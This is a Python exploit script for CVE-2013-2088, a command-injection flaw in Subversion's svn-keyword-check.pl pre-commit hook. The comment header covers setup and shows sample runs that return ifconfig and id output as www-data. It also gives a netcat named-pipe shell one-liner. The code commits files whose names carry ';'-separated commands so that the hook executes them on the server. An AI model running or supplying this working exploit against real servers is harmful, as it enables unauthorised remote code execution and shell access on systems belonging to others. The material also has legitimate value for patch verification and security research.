#  This is an exploit for the subversion vulnerability published as CVE-2013-2088.

#  Author: GlacierZ0ne (kai@ktechnologies.de)
#  Exploit Type: Code Execution
#  Access Type: Authenticated Remote Exploit
#  Prerequisites: svn command line client available,
#               subversion server exposes webdav through apache,
#               user/password with commit privilege

#  The exploit has been tested with the following software:

#  * subversion 1.6.6 server on Ubuntu 10.06 server 64-bit
#  * subversion 1.6.12 (r955767) on Ubuntu 11.10 server 32-bit
#  * subversion client version 1.8.8 (r1568071) on Ubuntu 14.04 64-bit

#  The following conditions need to be met in order for this to work:

#  The pre-commit script svn-keyword-check.pl needs to be configured as
#  pre-commit hook. The version shipped with the subversion 1.6.6 contains
#  a bug which prevents it from being used at all. This bug must be fixed
#  (otherwise neither the exploit, nor the intented purpose of the script
#  will work)
#  This perl script can be downloaded from the archive source distribution
#  at http://archive.apache.org/dist/subversion/. Scripts before 1.6.23
#  are vulnerable.

#  ###############################################################

#  1. configure the pre-commit hook to use svn-keyword-check.pl

#  ###############################################################
#  Copy the svn-keyword-check.pl from the source distribution to the
#  /svn/repos/<your repository>/hooks directory. Rename pre-commit.tmpl
#  to pre-commit. Make sure both files are owned by the user running
#  apache (e.g. www-data) and have the executable flag set:
#
#  notroot@ubuntu:/$ cd /svn/repositories/testrepo/hooks
#  notroot@ubuntu:/svn/repos/testrepo/hooks$ sudo mv pre-commit.tmpl pre-commit
#  notroot@ubuntu:/svn/repos/testrepo/hooks$ sudo chmod +x pre-commit
#  notroot@ubuntu:/svn/repos/testrepo/hooks$ ls -al
#  total 76
#  drwxr-xr-x 2 www-data www-data 4096 2016-09-30 13:35 .
#  drwxr-xr-x 7 www-data www-data 4096 2016-09-05 16:28 ..
#  -rw-r--r-- 1 www-data www-data 2000 2016-09-05 15:23 post-commit.tmpl
#  -rw-r--r-- 1 www-data www-data 1663 2016-09-05 15:23 post-lock.tmpl
#  -rw-r--r-- 1 www-data www-data 2322 2016-09-05 15:23 post-revprop-change.tmpl
#  -rw-r--r-- 1 www-data www-data 1592 2016-09-05 15:23 post-unlock.tmpl
#  -rwxr-xr-x 1 www-data www-data  604 2016-09-30 13:32 pre-commit
#  -rw-r--r-- 1 www-data www-data  609 2016-09-05 19:10 pre-commit.tmpl
#  -rw-r--r-- 1 www-data www-data 2410 2016-09-05 15:23 pre-lock.tmpl
#  -rw-r--r-- 1 www-data www-data 2796 2016-09-05 15:23 pre-revprop-change.tmpl
#  -rw-r--r-- 1 www-data www-data 2100 2016-09-05 15:23 pre-unlock.tmpl
#  -rw-r--r-- 1 www-data www-data 2830 2016-09-05 15:23 start-commit.tmpl
#  -rwxr-xr-x 1 www-data www-data 8340 2016-09-30 13:35 svn-keyword-check.pl
#  notroot@ubuntu:/svn/repos/testrepo/hooks$ 

#  According to the subversion documentation, svn-keyword-check.pl needs
#  to be called by pre-commit. svn-keyword-check.pl will return 1 if it
#  detects something that should prevent the commit. In that case, the
#  subversion server will cancel the commit. Here's how pre-commit looked
#  on my test server:

#  notroot@ubuntu:/svn/repos/testrepo/hooks$ cat pre-commit
#  #!/bin/sh

#  REPOS="$1"
#  TXN="$2"

#  # Make sure that the log message contains some text.
#  #jSVNLOOK=/usr/bin/svnlook
#  $SVNLOOK log -t "$TXN" "$REPOS" | \
#  ep "[a-zA-Z0-9]" > /dev/null || exit 1
#  
#  # Exit on all errors.
#  set -e
#  
#  # Check the files that are are listed in "svnlook changed" (except deleted
#  # files) for possible problems with svn:keywords set on binary files.
#  "$REPOS"/hooks/svn-keyword-check.pl --repos $REPOS --transaction $TXN
#  #
#  #
#  #
#  
#  # All checks passed, so allow the commit.
#  exit 0
#  
#  ###############################################################
#  
#  2. fix the bug in svn-keyword-check.pl
#  
#  ###############################################################
#  The script pre-commit will pass on repository and transaction to
#  the script svn-keyword-check.pl. Alternatively, it also accepts
#  repository and revision. However, specifying both transaction
#  and revision is illegal, only one of them is considered legal.
#  This reflects in the input parameter plausibility check
#   performed in line 89:
#  
#  if (defined($transaction) and !defined($revision)) {
#      croak "Can't define both revision and transaction!\n";
#  }
#  
#  Unfortunately, there is an exclamation mark too much. It must
#  be
#  
#  if (defined($transaction) and defined($revision)) {
#      croak "Can't define both revision and transaction!\n";
#  }
#  
#  The way this script is shipped in the 1.6.6 source distribution
#  no commit is possible at all.
#  
#  Before using the exploit you should first commit one file
#  manually so that the svn client can store your user/password
#  locally.
#  
#  Then, open a shell and navigate to the directory of your project
#  and start python cve-2013-2088-1.py <command>:
#
#  kai@KTEC64:~/eworkspace/kais_1_project$ python svn_exploit2.py ifconfig
#  [+] Randfilename is mJHeSkya
#  [+] Created random file
#  [+] Submitted random file to version control
#  [+] Created fake file for cmd execution
#  [+] Exploit seems to work: 
#
#  eth0      Link encap:Ethernet  HWaddr 00:0c:29:08:a3:1a  
#            inet addr:192.168.26.136  Bcast:192.168.26.255  Mask:255.255.255.0
#            inet6 addr: fe80::20c:29ff:fe08:a31a/64 Scope:Link
#            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
#            RX packets:1060 errors:0 dropped:0 overruns:0 frame:0
#            TX packets:806 errors:0 dropped:0 overruns:0 carrier:0
#            collisions:0 txqueuelen:1000 
#            RX bytes:172042 (172.0 KB)  TX bytes:136684 (136.6 KB)
#
#  lo        Link encap:Local Loopback  
#            inet addr:127.0.0.1  Mask:255.0.0.0
#            inet6 addr: ::1/128 Scope:Host
#            UP LOOPBACK RUNNING  MTU:16436  Metric:1
#            RX packets:0 errors:0 dropped:0 overruns:0 frame:0
#            TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
#            collisions:0 txqueuelen:0 
#            RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
#
#  kai@KTEC64:~/eworkspace/kais_1_project$ python svn_exploit2.py id
#  [+] Randfilename is WmolHiuv
#  [+] Created random file
#  [+] Submitted random file to version control
#  [+] Created fake file for cmd execution
#  [+] Exploit seems to work: 
#
#  uid=33(www-data) gid=33(www-data) groups=33(www-data)
#
#
#  Important things to notice

#  * For each command execution the exploit will put a file under
#    version control. If you submit a lot of commands you will
#    create a lot of files with random 8 alphanumeric character
#    file names in your repository.
#  * Your command must not contain a / since file names must not
#    contain a /. In the author's test environment the current
#    working directory of apache was the root folder /.
#    Therefore, the exploit will replace / in the command with
#    $(pwd). This worked fine for the author.
#    In your environment this might be different. As first thing
#    execute $(pwd) in order to check if this works for you, too.
#  * The command execution assumes that your command prints something
#    to the terminal and exits. If you know your command will not
#    immediately terminate (e.g. because you're starting a reverse/
#    bind shell), provide the -d or --dont-terminate flag:
#    python svn_exploit2.py -d "/bin/bash 0</tmp/mypipe | nc -l 192.168.1.100 4444 1> /tmp/mypipe"
#
#
#
import sys
import subprocess
import argparse
import random
import os

if __name__ == "__main__":

    lowerupper = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    slash_replacement = "$(pwd)"   
    cwd = os.getcwd()

    parser = argparse.ArgumentParser (usage="python {} [options] command".format (sys.argv [0]),
                        epilog="\x0a\x0a")

    parser.add_argument (dest="command", help="Command to execute")
    parser.add_argument ("-d", "--dont-terminate", help="don't force output be sent back to the client. Useful for reverse shell connections.",
                         action="store_true")

    #
    # args handling
    #
    if (len(sys.argv) <= 1):
        parser.print_help ()
        sys.exit (0)

    args = parser.parse_args ()
    if not args.command:
        parser.print_help ()
        sys.exit (0)

    #
    # / cannot be used in the command because svn will interprete it as
    # file separator. Therefore you have to use a workaround. Here,
    # $(pwd) works great for us.
    #
    command = args.command
    if command.find ("/") != -1:
        command = command.replace("/", slash_replacement)
        
    #
    # prepare output files for stdout, stderr
    #
    sout = open ("stdout", "w+")
    serr = open ("stderr", "w+")

    randfilename = ""
    for idx in range (0, 8):
        randfilename = randfilename + lowerupper [random.randint (0,51)]

    print ("[+] Randfilename is {}".format(randfilename))

    f = open (randfilename, "w+")
    f.write ("You've been pwned by GlacierZ0ne'") # write 4
    f.flush ()
    f.close ()

    p = subprocess.Popen (["svn", "add", "./{randfilename}".format (randfilename=randfilename)],
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
    c = p.communicate ()
    sout.write (c[0])
    if len(c[1]) > 0:
        print ("[-] Create random file failed:")
        print (c[1])
        sys.exit (0)
    print ("[+] Created random file")
 
    p = subprocess.Popen (["svn", "commit", "-m", "I pwned you", "./{randfilename}".format (randfilename=randfilename)],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    c = p.communicate ()
    sout.write (c[0])
    if len(c[1]) > 0:
        print ("[-] Submission of random file failed:")
        print (c[1])
        sys.exit (0)
    print ("[+] Submitted random file to version control")

    fakefilename = None
    if args.dont_terminate == True:
        fakefilename = "{}; {}".format (randfilename, command)
    else:
        fakefilename = "{}; {} 1>&2; exit 1".format (randfilename, command)
    f = open (fakefilename, "w+")
    f.write ("You've been pwned by GlacierZ0ne") # write 4
    f.flush ()
    f.close ()

    p = subprocess.Popen (["svn", "add", "{fakefilename}"
                          .format (cwd=cwd, fakefilename=fakefilename)],
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
    c = p.communicate ()
    sout.write (c[0])
    if len(c[1]) > 0:
        print ("[-] Creation of fake file failed:")
        print (c[1])
        sys.exit (0)
    print ("[+] Created fake file for cmd execution")
 
    p = subprocess.Popen (["svn", "commit", "-m", "I pwned you", "{fakefilename}"
                          .format (cwd=cwd, fakefilename=fakefilename)],
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    c = p.communicate ()
    sout.write (c[0])
    if len(c[1]) == 0:
        if not args.dont_terminate:
            print "[-] Something went wrong, pre-commit hook didn't kick in."
        else:
            print "[!] Done"
        sys.exit (0)
    else:
        idx0= c[1].find ("Commit blocked by pre-commit hook")
        idx = c[1].find ("failed with this output")
        
        if idx0 != -1 and idx != -1:
            print ("[+] Exploit seems to work: ")
            print (c[1][idx + len("failed with this output") + 1:])
    
    sout.flush ()
    sout.close ()
    serr.flush ()
    serr.close ()